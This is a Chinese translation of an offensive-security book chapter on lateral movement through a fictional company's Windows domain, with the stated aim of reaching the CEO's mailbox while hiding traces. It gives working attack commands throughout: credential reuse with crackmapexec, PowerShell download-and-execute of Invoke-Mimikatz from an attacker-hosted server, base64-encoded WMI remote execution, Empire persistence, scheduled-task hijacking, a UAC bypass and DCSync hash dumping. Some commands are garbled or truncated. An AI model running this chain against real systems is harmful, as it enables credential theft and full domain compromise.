# 第四章、内网漫游

> 只有勇敢的老鼠才敢在猫眼前搭窝 -- _Earl Derr Biggers_

事情已经越来越有趣了。到目前为止，我们已经拥有以下资源:

* 控制了一台蓝区（即DMZ区）的Linux服务器
* 在蓝区不同 Windows 服务器上掌握了6个具备管理员权限的账号
* 建立了一条虚拟隧道可以访问蓝区内部的机器

接下来要做的事情，其实和之前大同小异，无非是端口发现、漏洞利用、导出密码，如是往复。

但是，牢记我们的主要目标：获取CEO的邮箱访问权限，窃取关键数据，当然还要尽可能隐藏攻击痕迹。

## 4.1 活动目录

为了顺利学习本书的剩下内容，有必要了解活动目录（Active Directory，以下简称AD） 的一些基本知识，本节将介绍 AD 的基础概念。如果你已经非常了解 AD，可以直接跳过本节。

企业环境中的 Windows 计算机通常是互联的，以便于共享资源和公共配置。这种互联就基于 Windows AD。

AD 的根节点称为森林，森林中的所有域（机器组和用户组）共享相似的配置\[65\]。每个域遵循着各自的策略（如密码强度，更新计划，用户帐户，计算机等）。

域控是一台控制和管理该域的Windows服务器。所有资源依赖于这个中心节点，以制定决策或读取新配置。网络越大，为了扩展性能，域控就越多。

Windows 定义了两类用户可以连接到域：

* 域控服务器的本地用户
* 哈希存储在域控上的域用户

因此，域用户没有限定在单个工作站，而是可以连接到域中的所有工作站（除非被禁止这样做）。但是，要在服务器上进行远程连接，用户需要该服务器上的远程桌面权限或管理员权限（本地或通过域）。

用户既可以隶属于指定服务器的本地组，也可以隶属于域控群组（通常在域控服务器配置）。

域上有三个群组，对域及域内所有资源拥有完全控制权：

* Domain admin group（域管理员组）
* Enterprise admin group（企业管理员组）
* Domain Administrators（域管理员）

若能控制上述组的任一账户，那就拿下了整个公司的控制权\[66\]！

回过头看我们当前的状态，我们在公共DMZ区中入侵的Windows主机并没有连接到域上，不属于正式的内网，因为：域是一种内部资源，不会管理或者包含面向公众的互联网资源。在理想的情况下，会创建一个公共域（或Forest）来管理上述主机。当然，内部域和“外部”域之间不应存在信任关系。 SPH 选择了一个更简单的做法：将所有蓝区（即DMZ区）的服务器从内部域中排除，并使用单个管理员密码进行管理。

接下来的各小节就是从“外围” Windows服务器渗透到域主机，并在域中实现提权。

## 4.2 我们要去哪？

我们知道蓝区位于私有网络192.168.1.0/24上，但是绿区（即内网）的地址呢？我们可以盲猜其范围，不过没必要。

大多数情况下，DMZ服务器都会与个别内网主机通信交互，比如数据库，文件服务器，工作站等。这就是我们所需要的！

在我们控制的任一台服务器上，运行一个简单的netstat命令来列出所有已建立的IP连接。

```text
FrontGun$ proxychains crackmapexec -u Administrator - p M4ster_@dmin_123 -d WORKGROUP 192.168.1.70 - x "netstat -ano | findstr ESTABLISHED"
```

![netstat&#x663E;&#x793A;&#x793A;&#x610F;&#x56FE;](.gitbook/assets/4.2-1.jpg)

IP 10.10.20.118 显然不属于DMZ区。让我们试一试这个IP段。作为一个谨慎的黑客，我们先假设这是一个C段网络，后面再根据情况调整假设条件。

## 4.3 密码重用

我们的密码字典已经够用了，因此不需要在此IP段上寻找新的漏洞。毕竟，我们已经可以模拟普通用户登录了，为啥还要寻找复杂的漏洞？我们的策略是在所有Windows计算机上使用已经获得的凭据进行简单身份验证。

这不是典型的暴力破解攻击（一个帐户，多个密码），而是“成对的暴力破解” \[67\]：在每台计算机上，我们尝试使用相同的帐户/密码。这样可以避免帐户被锁定，也可以避免触发任何检测规则\[68\]。

我们的想法是找到一台已经入域的服务器，且该服务器的本地用户刚好在我们密码字典中。一个C段有253个IP，只要其中一个满足，就可以再次执行Mimikatz获取更多密码。但是这次，我们可能会获得域帐户-甚至是特权域帐户。

首先，为缩小目标机的范围，我们启动nmap去扫描开放了445端口的目标主机。经验表明3389端口很有用是，所以也添加了进来。

```text
FrontGun$ Proxychains nmap -n -p455,3389 10.10.20.0/24
Starting Nmap 7.00 ( https://nmap.org ) at 2016-12-26 22:56 CET
    Nmap scan report for 10.10.20.27 
    445/tcp open    microsoft-ds 
    3389/tcp closed ms-wbt-server

    Nmap scan report for 10.10.20.90 
    445/tcp open    microsoft-ds 
    3389/tcp filtered ms-wbt-server

    Nmap scan report for 10.10.20.97 
    445/tcp open    microsoft-ds 
    3389/tcp closed ms-wbt-server

    Nmap scan report for 10.10.20.118 
    445/tcp open microsoft-ds 
    3389/tcp open ms-wbt-server

    Nmap scan report for 10.10.20.210 
    445/tcp open    microsoft-ds 
    3389/tcp filtered ms-wbt-server

    Nmap scan report for 10.10.20.254 
    445/tcp filtered microsoft-ds 
    3389/tcp filtered ms-wbt-server
```

考虑到我们正在从蓝区访问这些服务器，可以预见到一些端口会被过滤掉。

在我们拿到的所有帐户中，**svc\_mnt** 看起来最有希望。它看起来像是一个用于管理某种应用程序的服务帐户。因此，相比其他账户，它在其他服务器上被创建的可能性更高。我们使用该帐户启动 CME：

```text
FrontGun$ proxychains crackmapexec -u svc_mnt -p Hello5\!981 -d WORKGROUP 10.10.20.27 10.10.20.90 10.10.20.97 10.10.20.118 10.10.20.210
```

![svc\_mnt&#x793A;&#x610F;&#x56FE;](.gitbook/assets/4.3-1.jpg)

`提示：！在bash中有特殊含义，需转义，尤其是放在数字前时。因此，此处密码字段为\！。`

仅有几台服务器存在**svc\_mnt**账号，这个结果可不太妙。此外，由于用户访问控制 （UAC），我们无法远程执行 Mimikatz.

UAC 是 Windows vista 中引入的一个功能，在执行特权操作\(软件安装等\)之前，会弹出一个对话框来提示用户。因此，即使管理员也不能在系统上远程执行特权命令。但默认的管理员帐户在默认状况下不受UAC的约束\[69\]，这就是为什么它以前没有给我们带来太多麻烦的原因。

幸运的是，其中一台存在**svc\_mnt**账号的主机10.10.20.118似乎开放了RDP 端口 （3389）。如果我们能在远程服务器上打开图形交互会话，那么UAC不再是问题了！

我们在Front Gun 服务器上启动 **rdesktop**（或 **mstsc**），用**svc\_mnt**帐户登录。

![&#x8FDC;&#x7A0B;&#x684C;&#x9762;&#x793A;&#x610F;&#x56FE;](.gitbook/assets/4.3-2.jpg)

然后，我们编写一个小脚本，下载一个powershell版的Mimikatz，只在内存中通过IEX\(Invoke-Expression\)命令运行。

```text
$browser = New-Object System.Net.WebClient

$browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredential

IEX($browser.DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1"))

invoke-Mimikatz
```

我们打开具有管理权限的命令提示符（右键单击&gt;以管理员身份运行），然后执行脚本:

```text
10.10.20.118 > powershell -exec bypass .\letmein.ps1
```

耐心地等待几秒钟，但**DowanloadString**函数执行超时了，看起来 10.10.20.0/24 网段的主机无法访问互联网—至少在没有通过需要有效域凭据的代理的情况下不能访问互联网，而我们还没有……

为了绕过这个限制，我们直接在之前拿下的 Linux 服务器下载**Invoke-Mimikatz.ps1**文件，并启动一个简单的 HTTP 服务使其可被访问:

```text
Career# wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
Career# python -m SimpleHTTPServer 443
```

我们更新 PowerShell 脚本来更新URL的变更，然后再次执行它:

```text
$browser = New-Object System.Net.WebClient

IEX($browser.DownloadString("http://192.168.1.46:443/I Mimikatz.ps1"))

invoke-Mimikatz
```

![&#x811A;&#x672C;&#x6267;&#x884C;&#x793A;&#x610F;&#x56FE;](.gitbook/assets/4.3-3.jpg)

虽然我们可能还不是域管理员，但我想你应该看到了屏幕上弹出的本地管理员的密码：**Dom\_M\_ster\_P\_ssword1**。

看来域计算机与非域计算机具有不同的本地管理员帐户。 现在酷的是我们可以在所有共享这个相同管理员帐户的机器上执行一个Mimikatz。 当然，有时会命中，有时却会丢失，但是我们只需要在正确的时间在正确的计算机上连接一个域特权帐户即可！

通过DMZ区内控制的Front Gun服务器上建立的socks代理，我们将直接从10.10.20.118服务器执行minikatz，而不是通过CrackMapExec。这样我们就可以完全绕过防火墙的限制。\(CME依赖RPC端口：135、49152到65535来远程执行Mimikatz，但在DMZ和内网之间的防火墙不太可能允许这样做。\)

我们使用获得的管理员帐户打开 RDP 会话，并通过添加**-Computer** switch修改脚本以支持在多台计算机上执行：

```text
$browser = New-Object System.Net.WebClient

IEX($browser.DownloadString("http://192.168.1.46:443/I Mimikatz.ps1"))

invoke-mimikatz -Computer FRSV27,FRSV210,FRSV229,FRSV97 |out-file result.txt -Append
```

这一次，**Invoke-Mimikatz**将使用远程 PowerShell 执行创建远程线程（端口 5985 上的 WinRM 服务），然后将结果存储在result.txt 中。

补充说明：

当使用远程PowerShell执行时，应总是指定服务器的名称而不是IP地址\(使用nslookup\)。

如果未启用远程 PowerShell（端口 5985），我们可以使用 Windows 计算机的 WMI 命令修复它： wmic /user:administrator /password: Dom\_M@ster\_P@ssword1 /node:10.10.20.229 process call create " powershell enable-PSRemoting -force "\`

![xx&#x793A;&#x610F;&#x56FE;](.gitbook/assets/4.3-4.jpg)

你看看！我们已经收集到 60 多个密码。果然，我们发现一个可能具有有趣特权的帐户：**adm\_supreme**。然后，我们查询"域管理员"组进一步确认： ![xx&#x793A;&#x610F;&#x56FE;](.gitbook/assets/4.3-5.jpg)

**adm\_supreme**确实属于"域管理员"组。我们攻下了！

`提示：查询域资源（组，用户等）时，请记住必须使用有效的域帐户。 在上面的屏幕中，在执行“ net group”命令之前，我们使用adm_supreme帐户重新连接到10.10.20.118。`

深度分析

使用invoke-mimikatz特性在多台机器上执行代码实际上并不可靠。如果管理员没有正确配置PowerShell remoting，则使其工作可能有点棘手。解决此类问题的一种方法是使用WMI，这是在服务器上执行远程命令的另一个有趣的工具。

我们的想法是创建一个行的PowerShell命令执行Mimikatz和转储内容到本地文件。 我们使用WMI远程启动此代码，等待几秒钟，然后在我们的计算机上检索文件。

接下来我们一步一步地分析：

1. 我们稍微更改以前的代码，将目标的 IP 地址包含在输出的文件名中:

```text
$browser = New-Object System.Net.WebClient
IEX($browser.DownloadString("http://192.168.1.46:443/I Mimikatz.ps1"))
$machine_name = (get-netadapter | get-netipaddress | ? addressfamily -eq "IPv4").ipaddress invoke-mimikatz | out-file c:\windows\temp\$machine_name".txt"
```

1. 我们将每个换行符更改为“;”，然后将此脚本放入PowerShell脚本的变量中：

   ```text
   PS > $command = '$browser = New-Object System.Net.WebClient;IEX($browser.DownloadString("htt Mimikatz.ps1"));$machine_name = (get-netadapter | get- netipaddress | ? addressfamily -eq "IPv4").ipaddress;invoke-mimikatz | out-file c:\windows\temp\$machine_name".txt"'
   ```

2. 我们对这个变量进行base64编码，并定义要定位的机器：

   ```text
   PS> $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
   PS> $encodedCommand = [Convert]::ToBase64String($bytes)
   PS> $PC_IP = @("10.10.20.229", "10.10.20.97")
   ```

3. 然后我们准备循环执行WMI，生成PowerShell，将前面的base64代码作为参数传递：

   ```text
   PS> invoke-wmimethod -ComputerName $X win32_process -name create -argumentlist ("powershell - encodedcommand $encodedCommand")
   ```

4. 最后，我们把导出的文件移到我们目标机10.10.20.118：

   ```text
   PS> move-item -path "\\$X\C$\windows\temp\$X.txt" - Destination C:\users\Administrator\desktop\ -force
   ```

   以下是整个脚本和一个小的附加代码片段，该附加代码段将等到远程进程完成后才检索结果:

```text
$command = '$browser = New-Object System.Net.WebClient;IEX($browser.DownloadString("htt Mimikatz.ps1"));$machine_name = (get-netadapter | get- netipaddress | ? addressfamily -eq "IPv4").ipaddress;invoke-mimikatz | out-file c:\windows\temp\$machine_name".txt"'

$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

$PC_IP = @("10.10.20.229", "10.10.20.97")

ForEach ($X in $PC_IP) {
$proc = invoke-wmimethod -ComputerName $X win32_process -name create -argumentlist ("powershell - encodedcommand $encodedCommand")
$proc_id = $proc.processId

do {(Write-Host "[*] Waiting for mimi to finish on $X"), (Start-Sleep -Seconds 2)}
until ((Get-WMIobject -Class Win32_process -Filter "ProcessId=$proc_id" -ComputerName $X | where
{$_.ProcessId -eq $proc_id}).ProcessID -eq $null) move-item -path "\\$X\C$\windows\temp\$X.txt" -
Destination C:\users\Administrator\desktop\ -force
write-host "[+] Got file for $X" -foregroundcolor "green"
}
```

## 4.4 遗漏的环节

还记得我们的网络钓鱼活动吗？当我们忙于同时购买机器和域时，员工们欣喜地打开我们的Excel文件。

![xx&#x793A;&#x610F;&#x56FE;](.gitbook/assets/4.4-1.jpg)

尽管我们现在控制着SPH网络上的所有资源，但让我们看看如何通过用户工作站来达到相同的结果。

注意：我们切换回Empire框架，在该框架中，Front Gun服务器正在监听等待来自Excel恶意软件的传入连接。

我们与随机目标互动，并列出有关环境的基本信息：

```text
(Empire) > interact D1GAMGTVCUM2FWZC
(Empire: D1GAMGTVCUM2FWZC) > sysinfo
    Listener:    http://<front-gun>:80 
    Internal IP:        10.10.20.54
    Username:    SPH\mike
    Hostname:    FRPC054
    OS:    Microsoft Windows 10 Pro High Integrity:    0
    Process Name:        powershell Process ID:    3404
    PSVersion:    5
(Empire: D1GAMGTVCUM2FWZC) > rename mike 
(Empire: mike) >
```

反向shell由后台运行的PowerShell进程托管。即使用户关闭了Excel文档，我们仍然保留对其计算机的访问权限。当然，简单的重启会杀死我们的代理。因此，在继续之前，我们需要采取一些预防措施。

在每次新登录时，Windows都会查找一些注册表项，并盲目执行许多程序。我们将使用这些注册表项之一来存储PowerShell脚本，该脚本将在Mike每次重新启动计算机时重新连接。

```text
(Empire:mike)> usemodule persistence/userland/registry
(Empire : persistence/userland/registry) > set Listener test
(Empire : persistence/userland/registry) > run
```

这个特定的模块使用RUN键来实现持久性_（HKCU Software Microsoft Windows CurrentVersion Ru_是无数恶意软件使用的已知方法）。这远不是我们所能想出的最隐秘的方法，但鉴于我们在工作站上的特权有限，我们暂时无法真正负担得起一些性感。

提示：只需更改模块中的目标“设置代理XXXXX”，即可在所有其他代理上盲目执行此模块。

现在，我们已经涵盖了这一点，我们希望定位的用户更有可能在域上具有某些管理特权，或者至少具有对某些服务器的访问权。一个明显的目标是IT支持部门。我们要求Active Directory列出在该部门注册的员工：

```text
(Empire: mike) > usemodule situational_awareness/network/powerview/get_user
(Empire: mike) > set filter department=IT* 
(Empire: mike) > run
Job started: Debug32_45g1z
company    : SPH
department    : IT support
displayname    : Holly 
title : intern IT
lastlogon : 12/31/2016 9:05:47 AM 
[...]
company    : SPH
department    : IT support
displayname    : John P 
title : IT manager
lastlogon : 12/31/2016 8:05:47 AM 
[...]
```

我们根据单击恶意文件的人员列表对结果进行交叉检查；亲爱的约翰脱颖而出\[70\]:

```text
(Empire:) > interact H3PBLVYYS3SYNBMA
(Empire H3PBLVYYS3SYNBMA :) > rename john
(Empire: john) > shell net localgroup administrators
    Alias name    administrators
    Members

    ------------------------------------------------------
    adm_wkt
    Administrator
```

尽管 John 是 IT 经理，但他的工作站上没有管理员权限。很好，有些挑战！

从这里可以采取多种途径：查找漏洞，配置错误的服务，文件或注册表项中的密码等。

在撰写本书时，非常流行的一种利用是利用**MS016-32** \[71\]漏洞。触发代码是用PowerShell编写的，非常适合我们当前的情况。但是，我们并不总是拥有进行公开漏洞利用的奢侈，因此我们将走更可靠的道路。

我们运行**PowerUp**模块，该模块在 Windows 上执行常规检查，以确定提升计算机特权的可行路径：

```text
(Empire: john) > usemodule privesc/powerup/allchecks 
(Empire: privesc/powerup/allchecks) > run
(Empire: privesc/powerup/allchecks) >
Job started: Debug32_m71k0

[*] Running Invoke-AllChecks
[*] Checking if user is in a local group with administrative privileges...
[*] Checking service permissions...
[*] Use 'Write-ServiceEXE -ServiceName SVC' or 'Write-ServiceEXECMD' to abuse any binaries 
[*] Checking for unattended install files...
[*] Checking for encrypted web.config strings... 
[…]
```

没有错误配置的服务，可劫持的DLL或纯文本密码。让我们看一下计划任务列表：

```text
(Empire: john) > shell schtasks /query /fo LIST /v 
(Empire: john) >
    Folder: \
    HostName:    FRPC073
    TaskName:    \Chance screensaver
    Next Run Time:        N/A 
    Status:    Ready
    Logon Mode:        Interactive/Background 
    Last Run Time:        1/15/2017 1:58:22 PM 
    Author:        SPH\adm_supreme
    Task To Run:    C:\Apps\screensaver\launcher.bat 
    Comment:    Change screensaver 
    Scheduled Task State:        Enabled
    Run As User:    Users
    Schedule Type:    At logon time
```

有趣的是，任务计划在用户每次登录工作站时定期更新他们的屏幕保护程序。

该脚本是一个简单的“launcher.bat”，位于“c: apps\screensaver\”中。放在这个文件夹上的访问列表呢？

```text
(Empire: john) > shell icacls c:\apps\screensaver 
(Empire: john) >
c:\apps\screensaver BUILTIN\Administrators:(F) 
    CREATOR OWNER:(OI)(CI)(IO)(F) 
    BUILTIN\Users:(OI)(CI)(F) 
    BUILTIN\Users:(I)(CI)(WD) 
    CREATOR OWNER:(I)(OI)(CI)(IO)(F)
    NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
    BUILTIN\Administrators:(I)(OI)(CI)(F) 
Successfully processed 1 files; Failed processing 0 files
```

答对了！每个用户都可以完全控制文件夹“ C： Apps screensaver \”（“ F”权限）。我们可以通过使用自己的脚本替换“ launcher.bat”文件来劫持计划的任务。例如，一个脚本启动Mimikatz并将密码转储到本地文件（c： users john appdata local temp pass\_file.txt）。

我们一如既往地通过在base64中进行编码来准备代码。该步骤与之前相同，因此我不再赘述：

```text
PS> $command = '$browser = New-Object System.Net.WebClient;$browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredential
Mimikatz.ps1"));invoke-mimikatz | out-file c:\users\john\appdata\local\temp\pass_file.txt'

PS>    $bytes    = [System.Text.Encoding]::Unicode.GetBytes($command)
PS>    $encodedCommand    = [Convert]::ToBase64String($bytes)
PS> write-host $encodedCommand JABiAHIAbwB3AHMAZQByACAAPQAgAE4AZQB3A
```

以下是脚本“ launcher\_me.bat”，该脚本最终在John的工作站上运行： `Powershell.exe -NonI -W Hidden -encJABiAHIAbwB3AHMAZQByACAAPQAgAE4AZQB3A`

我们使用Empire将其上传到目标文件夹：

```text
(Empire: john) > shell cd c:\apps\screensaver\
(Empire: john) > upload /root/launch_me.bat
```

最后，我们将脚本伪装成新的launcher.bat。

```text
(Empire: john) > shell move launcher.bat launcher_old.bat
(Empire: john) > shell move launcher_me.bat launcher.bat
```

然后，我们等待；几个小时，也许是一两天。最终，当约翰再次登录\[72\]时，我们可以获取我们的文件（当然还清理了一些小混乱）：

```text
(Empire: john2) > shell download c:\users\john\appdata\local\temp\pass_file.txt 
(Empire: john2) > shell del launcher.bat 
(Empire: john2) > shell move launcher_old.bat launcher.bat

FrontGun$ cat pass_file.txt

Hostname: FRPC073.sph.corp / -
.#####.    mimikatz 2.1 (x64) built on Mar 31 2016 16:45:32
.## ^ ##. "A La Vie, A L'Amour" ## / \ ## /* * *
##    \    /    ##    Benjamin    DELPY    `gentilkiwi`    ( benjamin@gentilkiwi.com )
'## v ##'    http://blog.gentilkiwi.com/mimikatz (oe.eo)
'#####'    with 18 modules * * */

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 11506673 (00000000:00af93f1) Session    : Interactive from 2
User Name    : john
Domain    : SPH
Logon Server    : FRSV073
Logon Time    : 16/01/2017 8:40:50 AM
SID    : S-1-5-21-2376009117-2296651833- 4279148973-1124
[…]

kerberos :
    *    Username : john
    *    Domain    : SPH.CORP
    *    Password : JP15XI$ ssp :
    credman :
    […]

    […] 
kerberos :
    * Username : adm_supreme
    *    Domain    : SPH.CORP
    * Password : Charvel097*
    ssp : 
    credman :
    […]
```

有趣！似乎已执行此计划任务，并具有adm\_supreme的特权： ![xxx&#x793A;&#x610F;&#x56FE;](.gitbook/assets/4.4-2.jpg)

我们使用这些新获得的凭据在工作站上产生一个新的管理会话。

```text
(Empire:) > usemodule management/spawnas
(Empire:    management/spawnas)    >    set    UserName adm_supreme
(Empire: management/spawnas) > set Domain SPH (Empire:    management/spawnas)    >    set    Password Charvel097*
(Empire: management/spawnas) > set Agent john (Empire: management/spawnas) > run
Launcher bat written to C:\Users\Public\debug.bat


Handles NPM(K)    PM(K)    WWS(K) VM(M)    CPU(s)
Id SI ProcessName
------- ------    -----    ----- -----    ------    --    --  --
6 4    1380 236 ...63    0.00    5404 2 cmd
```

![xxx&#x793A;&#x610F;&#x56FE;](.gitbook/assets/4.4-3.jpg)

新的adm\_supreme会话实际上在工作站上具有受限的特权（UAC再次发出警报）。如果我们需要执行提升操作，例如设置更好的持久性方法，监视John等，我们需要使用更高的特权上下文，从而绕过UAC：

```text
(Empire: admSupreme) > usemodule privesc/bypassuac_eventvwr
(Empire: privesc/bypassuac_eventvwr) > set Listener test
(Empire: privesc/bypassuac_eventvwr) > run
Job started: Debug32_23tc3
```

![xxx&#x793A;&#x610F;&#x56FE;](.gitbook/assets/4.4-4.jpg)

在我们亲爱的adm\_supreme的用户名前面的小星星意味着它是一个提升的会话。我们可以使用此会话在工作站上设置持久性和其他漂亮的东西。

## 4.5 更多密码

总而言之，我们获得了一个域管理员帐户。仅此一项就足以造成严重破坏。但是，当该特定管理员更改密码时会发生什么？考虑到我们已经拥有的访问级别，是否可以在不产生过多噪音的情况下设法转储更多密码？

答案在于NTDS.DIT文件：Active Directory的数据库，其中包含配置方案，资源定义以及所有用户密码的哈希值。它在每个域控制器上存储和复制。

以下是请求域管理员Hash的命令行：

```text
PS> $browser = New-Object System.Net.WebClient
PS> IEX($browser.DownloadString("http://192.168.1.90:443/IMimikatz.ps1"))
PS> invoke-mimikatz -Command '"lsadump::dcsync/domain:sph.corp /user:administrator"'
```

![xxx&#x793A;&#x610F;&#x56FE;](.gitbook/assets/4.5-1.jpg)

使用此帐号，我们将永不再受UAC的约束!我们对每个我们感兴趣的域帐户遍历此命令。我们可以通过传递Hash来冒充这些用户。

提示:一种有趣的持久化技术是生成黄金票据\(Kerberos票据，有效期为10年\)。查看:[http://blog.gentilkiwi.com/securite/mimikatz/golden-ticket-kerberos。](http://blog.gentilkiwi.com/securite/mimikatz/golden-ticket-kerberos。)

> 翻译：Regina9Li 2019/10/27

